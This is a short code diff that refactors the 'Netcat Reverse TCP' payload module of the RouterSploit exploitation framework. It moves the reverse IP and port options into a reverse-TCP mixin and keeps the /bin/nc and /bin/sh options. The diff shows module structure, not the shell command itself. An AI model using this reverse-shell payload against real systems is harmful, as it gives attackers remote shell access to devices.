@@ -1,11 +1,8 @@
-from routersploit import (
-    exploits,
-    payloads,
-    validators
-)
+from routersploit import exploits
+from routersploit.payloads import GenericPayload, ReverseTCPPayloadMixin
 
 
-class Exploit(payloads.Payload):
+class Exploit(GenericPayload, ReverseTCPPayloadMixin):
     __info__ = {
         'name': 'Netcat Reverse TCP',
         'authors': [
@@ -16,12 +13,6 @@ class Exploit(payloads.Payload):
         'devices': [
         ],
     }
-
-    architecture = "generic"
-    handler = "reverse_tcp"
-
-    lhost = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
-    lport = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
     netcat_binary = exploits.Option('/bin/nc', 'Netcat binary')
     shell_binary = exploits.Option('/bin/sh', 'Shell')
 
